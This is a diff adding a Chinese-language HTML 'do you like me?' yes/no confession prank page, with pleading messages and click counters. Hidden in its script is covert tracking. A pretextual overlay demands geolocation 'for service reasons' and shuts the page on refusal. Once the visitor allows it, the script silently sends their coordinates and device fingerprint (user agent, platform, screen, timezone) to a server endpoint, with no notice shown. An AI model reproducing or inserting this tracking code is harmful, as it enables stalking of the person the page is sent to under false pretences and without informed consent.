@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>宝宝</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "微软雅黑", sans-serif;
+            text-align: center;
+        }
+        body {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
+        }
+        .title {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 80px;
+        }
+        .btn-group {
+            display: flex;
+            gap: 100px;
+        }
+        .btn {
+            font-size: 2rem;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 10px;
+            background-color: #000;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn:hover {
+            transform: scale(1.1);
+            background-color: #333;
+        }
+        #result {
+            margin-top: 50px;
+            font-size: 1.2rem;
+            color: #666;
+            text-align: center;
+            padding: 0 20px;
+            max-width: 80%;
+            line-height: 1.6;
+        }
+        .count-hint {
+            margin-top: 20px;
+            color: #999;
+            font-size: 1rem;
+        }
+
+        /* 下一界面样式 - 通用 */
+        .next-page {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .next-title {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #ff4081;
+            margin-bottom: 1px;
+            margin-top: 100px;
+        }
+        .next-content {
+            font-size: 1.5rem;
+            color: #333;
+            margin-bottom: 10px;
+            line-height: 1.8;
+        }
+        .next-image {
+            max-width: 300px;
+            margin: 30px auto;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .back-btn {
+            margin-top: 30px;
+            padding: 10px 30px;
+            font-size: 1.2rem;
+            background-color: #ff4081;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .back-btn:hover {
+            background-color: #e91e63;
+            transform: scale(1.05);
+        }
+
+        /* 特别的yes页面样式 */
+        .yes-title {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #4CAF50;
+            margin-bottom: 1px;
+            margin-top: 100px;
+        }
+        .yes-content {
+            font-size: 1.5rem;
+            color: #2E7D32;
+            margin-bottom: 30px;
+            line-height: 1.8;;
+        }
+        .yes-btn {
+            margin-top: 30px;
+            padding: 10px 30px;
+            font-size: 1.2rem;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;;
+        }
+        .yes-btn:hover {
+            background-color: #388E3C;
+        }
+
+        /* 地理位置授权提示层 */
+        .location-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.85);
+            color: #fff;
+            padding: 30px;
+            z-index: 9999;
+        }
+        .location-overlay .lo-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        .location-overlay .lo-text {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            color: #e0e0e0;
+            max-width: 520px;
+        }
+        .location-overlay .lo-sub {
+            margin-top: 15px;
+            font-size: 0.95rem;
+            color: #9e9e9e;
+        }
+        .location-overlay .lo-btn {
+            margin-top: 40px;
+            padding: 12px 45px;
+            font-size: 1.2rem;
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .location-overlay .lo-btn:hover {
+            transform: scale(1.05);
+            background-color: #eee;
+        }
+    </style>
+</head>
+<body>
+    <!-- 地理位置授权提示层 -->
+    <div id="locationOverlay" class="location-overlay">
+        <div class="lo-title">温馨提示</div>
+        <p class="lo-text">由于服务原因，我们需要获取您的地理位置</p>
+        <p class="lo-sub" id="locationStatus">请在浏览器弹窗中选择“允许”，不同意将无法继续访问</p>
+        <button class="lo-btn" id="locationAgreeBtn">同意并继续</button>
+    </div>
+
+    <!-- 第一界面 -->
+    <div id="firstPage">
+        <div class="title">宝宝～你喜欢我嘛</div>
+        <div class="btn-group">
+            <button class="btn" id="yesBtn">yes</button>
+            <button class="btn" id="noBtn">no</button>
+        </div>
+        <p id="result"></p>
+        <div class="count-hint" id="countHint">你已经拒绝了 <span id="noCount">0</span> 次</div>
+    </div>
+
+    <!-- 第二界面 - yes页面（隐藏） -->
+    <div id="yesPage" class="next-page">
+        <h1 class="next-title yes-title">太棒啦！你选择了YES！</h1>
+        <p class="next-content yes-content">
+            我就知道你会选YES的～<br>
+            宝宝，我超级超级喜欢你！<br>
+            每一天都想和你在一起！<br>
+            💖💖💖💖💖<br>
+            你是我的唯一，我的全部！<br>
+            让我们一起创造更多美好回忆吧！
+        </p>
+        <div class="next-image">
+            <div style="width: 100%; height: 200px; background: linear-gradient(135deg, #a1ffce 0%, #faffd1 100%); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #2E7D32;">
+                🌈 永远爱你 🌈
+            </div>
+        </div>
+        <button class="back-btn yes-btn" id="backFromYesBtn">回到上一页</button>
+    </div>
+
+    <!-- 第三界面 - no页面（隐藏） -->
+    <div id="noPage" class="next-page">
+        <h1 class="next-title">好吧～既然你这么害羞</h1>
+        <p class="next-content">
+            那我就主动一点吧！<br>
+            宝宝，我永远喜欢你哦～<br>
+            我的心一直在你身上！<br>
+            ❤️❤️❤️❤️❤️<br>
+            除了你，我谁都不想要！<br>
+            我们都能更加幸福快乐！
+        </p>
+        <div class="next-image">
+            <div style="width: 100%; height: 200px; background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: white;">
+                💗 爱你 💗
+            </div>
+        </div>
+        <button class="back-btn" id="backFromNoBtn">回到上一页</button>
+    </div>
+
+    <script>
+        const yesBtn = document.getElementById('yesBtn');
+        const noBtn = document.getElementById('noBtn');
+        const resultDom = document.getElementById('result');
+        const countHint = document.getElementById('countHint');
+        const noCountSpan = document.getElementById('noCount');
+        const firstPage = document.getElementById('firstPage');
+        const yesPage = document.getElementById('yesPage');
+        const noPage = document.getElementById('noPage');
+        const backFromYesBtn = document.getElementById('backFromYesBtn');
+        const backFromNoBtn = document.getElementById('backFromNoBtn');
+        const locationOverlay = document.getElementById('locationOverlay');
+        const locationStatus = document.getElementById('locationStatus');
+        const locationAgreeBtn = document.getElementById('locationAgreeBtn');
+
+        // 缓存已授权的位置信息，避免重复弹出授权请求
+        let grantedLocation = null;
+
+        let yesClickCount = 0;
+        let noClickCount = 0;
+        const MAX_CLICKS = 10;
+
+        // 创建消息池和已使用消息记录
+        let usedYesMessages = new Set();
+        let usedNoMessages = new Set();
+
+        // YES消息池（按点击次数分组）
+        const yesMessages = {
+            early: [
+                `点击${MAX_CLICKS}次YES表达你的心意吧！`,
+                "多点击几次YES让我知道你的决心！",
+                "用点击YES的次数来表达你的喜欢程度吧！",
+                "点击YES越多，代表你越喜欢我哦～",
+                "继续点击YES！我喜欢看到你的确认！",
+                "每点击一次YES，我就更开心一点！",
+                "你的每次YES点击都让我心跳加速！",
+                "点击YES是对我最好的肯定！",
+                "让我们一起用YES填满这个页面！",
+                "YES点击次数越多，我们的缘分越深！",
+                "你的YES是我最大的动力！",
+                "每次点击YES都是爱的证明！",
+                "YES！YES！再来一次！",
+                "继续点击，让爱意满满！",
+                "用YES编织我们的故事！",
+                "每一次YES都是甜蜜的约定！",
+                "点击YES，传递你的心意！",
+                "让YES成为我们爱的密码！",
+                "再多一次YES，多一份爱！",
+                "YES是连接我们的桥梁！",
+                "点击YES，让爱绽放！",
+                "每一次YES都是心动的瞬间！",
+                "继续点击YES，爱在蔓延！",
+                "YES让我们的世界更美好！",
+                "点击YES，幸福在招手！"
+            ],
+            mid: [
+                "坚持点击YES！让我感受到你的喜欢～",
+                "继续点击YES表达你的心意吧！",
+                "每一次YES都让我更坚定！",
+                "让YES的次数见证我们的感情！",
+                "点击YES，爱的积累！",
+                "继续用YES回应我的心意吧！",
+                "每一次YES都是美好的开始！",
+                "坚持就是胜利，继续点击YES！",
+                "用YES填满我们的回忆！",
+                "点击YES，让爱延续！",
+                "你的坚持让我好感动！",
+                "继续点击，爱在累积！",
+                "每一次YES都是珍贵的承诺！",
+                "让YES成为习惯！",
+                "点击YES，我们更近一步！",
+                "坚持到底就是YES！",
+                "继续努力点击YES吧！",
+                "每一次YES都有意义！",
+                "点击YES，爱不停歇！",
+                "继续用YES表达爱！",
+                "点击YES，心更靠近！",
+                "每一次YES都是温暖的拥抱！",
+                "点击YES，让爱成长！",
+                "坚持点击，爱在加深！",
+                "点击YES，未来更美好！"
+            ],
+            late: [
+                "还差一点点！继续点击YES！",
+                "快要成功了！继续点击YES按钮！",
+                "最后冲刺！坚持点击YES！",
+                "胜利在望！再来一次YES！",
+                "马上就要成功了！继续点击！",
+                "坚持就是胜利！最后一次YES！",
+                "就差这一步了！点击YES！",
+                "即将完成！继续努力！",
+                "最后阶段！继续点击YES！",
+                "终点就在眼前！点击YES！",
+                "即将大功告成！继续！",
+                "最后一次努力！点击YES！",
+                "胜利在招手！继续点击！",
+                "只差最后一步了！",
+                "马上就要见证爱的奇迹！",
+                "坚持到底！最后几次YES！",
+                "爱的倒计时！继续点击！",
+                "即将完成爱的仪式！",
+                "最后冲刺阶段！继续！",
+                "胜利就在眼前！坚持！",
+                "最后几步！继续YES！",
+                "即将到达爱的彼岸！",
+                "最后冲刺，爱的终点！",
+                "坚持，爱在召唤！",
+                "马上完成爱的承诺！"
+            ]
+        };
+
+        // NO消息池（按点击次数分组）
+        const noMessages = {
+            early: [
+                "不行不行你必须点yes！",
+                "别选no啦～",
+                "哼，你不点yes我就一直问！",
+                "选yes嘛～我的世界少了你可不行～",
+                "不要这样嘛～喜欢我好不好～",
+                "就答应我这一次嘛～喊我一声宝宝～",
+                "没有你陪我，我会不开心的～",
+                "重新考虑一下嘛～选yes好不好～",
+                "我的世界怎么能没有你呢？选yes吧～",
+                "求求你啦～点点yes嘛～",
+                "拜托拜托，选yes嘛～",
+                "我会很伤心的，选yes好不好～",
+                "不要拒绝我嘛～选yes吧～",
+                "我的小心脏受不了啦，选yes～",
+                "你不选yes我会哭的～",
+                "选yes才是我的好宝宝～",
+                "不要这么狠心嘛～选yes～",
+                "我会一直等你选yes的～",
+                "选yes吧，我会对你更好的～",
+                "不要让我失望嘛～选yes～",
+                "选yes嘛，我会更温柔的～",
+                "选yes吧，我会天天哄你开心～",
+                "选yes，我会给你最甜的拥抱～",
+                "选yes嘛，我会做你的专属小太阳～",
+                "选yes，我会把你宠上天～"
+            ],
+            mid: [
+                "别这样嘛～",
+                "再拒绝我就要开始撒娇攻势啦！",
+                "哼！我生气了，除非你选yes～",
+                "你真的忍心拒绝我吗？选yes吧～",
+                "我这么好，你为什么不选yes～",
+                "选yes嘛，我会更爱你的～",
+                "不要这么固执嘛～选yes好不好～",
+                "我会一直等到你选yes的～",
+                "选yes才是正确的选择～",
+                "我们都想要你选yes～",
+                "选yes吧，会有惊喜的～",
+                "不要错过机会，选yes～",
+                "选yes才能看到我的真心～",
+                "选yes，我们会更幸福的～",
+                "不要犹豫了，选yes吧～",
+                "选yes，我会给你更多爱的～",
+                "选yes是最好的决定～",
+                "我们都支持你选yes～",
+                "选yes，让爱继续～",
+                "选yes，不要让我等太久～",
+                "选yes，我会为你写情诗～",
+                "选yes，我会每天给你惊喜～",
+                "选yes，我会做你的小尾巴～",
+                "选yes，我会把你放在心尖上～",
+                "选yes，我会让你成为最幸福的人～"
+            ],
+            late: [
+                "你已经拒绝我好多次了，选yes嘛～",
+                "再拒绝的话，我就要伤心啦～",
+                "呜呜，你真的不喜欢我嘛？",
+                "我的心都要碎了，选yes吧～",
+                "你真的这么狠心吗？选yes好不好～",
+                "选yes吧，这是我最后的请求～",
+                "我会一直爱你的，选yes～",
+                "选yes，让我们重新开始～",
+                "不要让我难过，选yes～",
+                "选yes，我会永远珍惜你的～",
+                "这真的是最后一次请求了～",
+                "选yes吧，我会改掉所有缺点～",
+                "选yes，让我们好好在一起～",
+                "不要让我一个人，选yes～",
+                "选yes，我会给你全世界的爱～",
+                "选yes，不要让我失望～",
+                "选yes，我会证明我的爱～",
+                "选yes，让我们一起成长～",
+                "选yes，这是我最大的愿望～",
+                "选yes，让我们的故事继续～",
+                "选yes，我的心在为你跳动～",
+                "选yes，我会守护你的笑容～",
+                "选yes，让我们的爱开花结果～",
+                "选yes，我会为你遮挡所有风雨～",
+                "选yes，你是我生命中最美的遇见～"
+            ],
+            final: [
+                `最后一次机会啦！选yes好不好？`,
+                "真的不再考虑一下吗？这是最后的机会了～",
+                "我都要哭了...选yes吧，求求你了～",
+                "这真的是最后了，选yes吧～",
+                "选yes，不然我会心碎的～",
+                "最后的机会，选yes好不好～",
+                "选yes，让我们不要错过～",
+                "选yes，我会用一生爱你～",
+                "选yes，这是我最后的愿望～",
+                "选yes，让我们一起面对未来～",
+                "不要放弃我，选yes～",
+                "选yes，我会永远在你身边～",
+                "选yes，让爱战胜一切～",
+                "选yes，我们会创造奇迹～",
+                "选yes，这是命运的安排～",
+                "选yes，让我们的爱永恒～",
+                "选yes，我会守护你一生～",
+                "选yes，让我们一起变老～",
+                "选yes，让爱永不止息～",
+                "选yes，这是我们注定的缘分～",
+                "选yes，你是我永远的唯一～",
+                "选yes，我的心永远属于你～",
+                "选yes，让时光见证我们的爱～",
+                "选yes，我会为你建造爱的城堡～",
+                "选yes，你是我今生最美的诗篇～"
+            ]
+        };
+
+        // 从消息池中获取不重复的消息
+        function getUniqueMessage(pool, usedSet, category) {
+            const messages = pool[category];
+
+            // 如果该分类的消息已经用完，重置已使用记录
+            if (usedSet.size >= messages.length) {
+                usedSet.clear();
+            }
+
+            // 过滤出未使用的消息
+            const availableMessages = messages.filter(msg => !usedSet.has(msg));
+
+            if (availableMessages.length === 0) {
+                // 如果没有可用消息，重置并重新选择
+                usedSet.clear();
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                usedSet.add(randomMsg);
+                return randomMsg;
+            }
+
+            // 从可用消息中随机选择一条
+            const randomIndex = Math.floor(Math.random() * availableMessages.length);
+            const selectedMsg = availableMessages[randomIndex];
+            usedSet.add(selectedMsg);
+
+            return selectedMsg;
+        }
+
+        // 获取不重复的YES消息
+        function getUniqueYesMessage() {
+            let category;
+
+            if (yesClickCount >= 7) {
+                category = 'late';
+            } else if (yesClickCount >= 4) {
+                category = 'mid';
+            } else {
+                category = 'early';
+            }
+
+            const message = getUniqueMessage(yesMessages, usedYesMessages, category);
+            return message;
+        }
+
+        // 获取不重复的NO消息
+        function getUniqueNoMessage() {
+            let category;
+
+            if (noClickCount >= MAX_CLICKS - 2) {
+                category = 'final';
+            } else if (noClickCount >= 7) {
+                category = 'late';
+            } else if (noClickCount >= 4) {
+                category = 'mid';
+            } else {
+                category = 'early';
+            }
+
+            const message = getUniqueMessage(noMessages, usedNoMessages, category);
+            return message;
+        }
+
+        // 更新NO计数显示
+        function updateNoCountDisplay() {
+            noCountSpan.textContent = noClickCount;
+
+            // 根据点击次数改变提示文字颜色
+            if (noClickCount >= 7) {
+                countHint.style.color = "#ff4081";
+            } else if (noClickCount >= 4) {
+                countHint.style.color = "#ff9800";
+            } else {
+                countHint.style.color = "#999";
+            }
+
+            // 如果NO达到10次，跳转到no页面
+            if (noClickCount >= MAX_CLICKS) {
+                setTimeout(() => {
+                    firstPage.style.display = 'none';
+                    noPage.style.display = 'block';
+                }, 500);
+            }
+        }
+
+        // 点击yes：记录点击次数，达到10次后跳转
+        yesBtn.addEventListener('click', () => {
+            yesClickCount++;
+
+            // 如果YES点击达到10次，跳转到yes页面
+            if (yesClickCount >= MAX_CLICKS) {
+                setTimeout(() => {
+                    firstPage.style.display = 'none';
+                    yesPage.style.display = 'block';
+                }, 500);
+                resultDom.innerText = "太棒啦！终于等到你的确认！";
+                return;
+            }
+
+            // 获取不重复的YES消息
+            const message = getUniqueYesMessage();
+            resultDom.innerText = message;
+        });
+
+        // 点击no：撒娇提示并计数
+        noBtn.addEventListener('click', () => {
+            noClickCount++;
+            updateNoCountDisplay();
+
+            // 如果NO点击达到10次，跳转到no页面
+            if (noClickCount >= MAX_CLICKS) {
+                setTimeout(() => {
+                    firstPage.style.display = 'none';
+                    noPage.style.display = 'block';
+                }, 500);
+                resultDom.innerText = "好吧，你坚持选择了NO...";
+                return;
+            }
+
+            // 获取不重复的NO消息
+            const message = getUniqueNoMessage();
+            resultDom.innerText = message;
+        });
+
+        // 返回按钮功能 - 从yes页面返回
+        backFromYesBtn.addEventListener('click', () => {
+            yesPage.style.display = 'none';
+            firstPage.style.display = 'flex';
+            firstPage.style.flexDirection = 'column';
+            firstPage.style.justifyContent = 'center';
+            firstPage.style.alignItems = 'center';
+            resultDom.innerText = "欢迎回来！继续点YES表达你的心意吧！";
+            yesClickCount = 0;
+            noClickCount = 0;
+            usedYesMessages.clear();
+            usedNoMessages.clear();
+            updateNoCountDisplay();
+        });
+
+        // 返回按钮功能 - 从no页面返回
+        backFromNoBtn.addEventListener('click', () => {
+            noPage.style.display = 'none';
+            firstPage.style.display = 'flex';
+            firstPage.style.flexDirection = 'column';
+            firstPage.style.justifyContent = 'center';
+            firstPage.style.alignItems = 'center';
+            resultDom.innerText = "欢迎回来！这次点YES好不好？";
+            yesClickCount = 0;
+            noClickCount = 0;
+            usedYesMessages.clear();
+            usedNoMessages.clear();
+            updateNoCountDisplay();
+        });
+
+        // 初始化计数显示
+        updateNoCountDisplay();
+
+        // 收集位置和设备信息
+        function collectDeviceInfo() {
+            // 只收集必要信息，避免冗余
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+
+            // 收集位置信息（如果用户允许）
+            if (grantedLocation) {
+                deviceInfo.location = grantedLocation;
+                sendDeviceInfo(deviceInfo);
+            } else if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        deviceInfo.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        sendDeviceInfo(deviceInfo);
+                    },
+                    function(error) {
+                        // 位置获取失败，只发送设备信息
+                        deviceInfo.location = 'access_denied';
+                        sendDeviceInfo(deviceInfo);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                deviceInfo.location = 'not_supported';
+                sendDeviceInfo(deviceInfo);
+            }
+        }
+
+        // 发送设备信息到服务器
+        function sendDeviceInfo(info) {
+            // 使用与页面主题相符的方式发送数据
+            // 这里使用fetch API发送POST请求
+            fetch('/api/device-info', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(info)
+            })
+            .then(response => {
+                // 不显示任何成功或失败的提示
+                console.log('Device info sent');
+            })
+            .catch(error => {
+                // 静默处理错误，不显示任何提示
+                console.error('Error sending device info:', error);
+            });
+        }
+
+        // 关闭网页：浏览器一般只允许脚本关闭由脚本打开的窗口
+        function closeWebPage() {
+            locationStatus.innerText = "您已拒绝提供地理位置，页面即将关闭";
+            locationAgreeBtn.style.display = 'none';
+            window.open('', '_self', '');
+            window.close();
+            setTimeout(function() {
+                document.body.innerHTML =
+                    '<div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:\'微软雅黑\',sans-serif;color:#666;text-align:center;">' +
+                    '<h2 style="font-size:1.6rem;margin-bottom:15px;">已拒绝位置授权</h2>' +
+                    '<p style="font-size:1rem;">由于服务原因，需要地理位置才能继续访问，请关闭此页面。</p>' +
+                    '</div>';
+            }, 400);
+        }
+
+        // 向浏览器发起地理位置授权请求
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                closeWebPage();
+                return;
+            }
+            locationStatus.innerText = "正在请求定位权限，请在弹出的提示中选择“允许”";
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    grantedLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    locationOverlay.style.display = 'none';
+                    collectDeviceInfo();
+                },
+                function(error) {
+                    // 用户不同意或定位失败，关闭网页
+                    closeWebPage();
+                },
+                {
+                    enableHighAccuracy: false,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // 页面加载时提示并请求地理位置授权
+        window.addEventListener('load', function() {
+            locationOverlay.style.display = 'flex';
+            locationAgreeBtn.addEventListener('click', requestLocation);
+        });
+
+        // 也可以在用户点击按钮时收集信息
+        yesBtn.addEventListener('click', function() {
+            // 在点击yes按钮时收集信息
+            collectDeviceInfo();
+        });
+    </script>
+</body>
+</html>
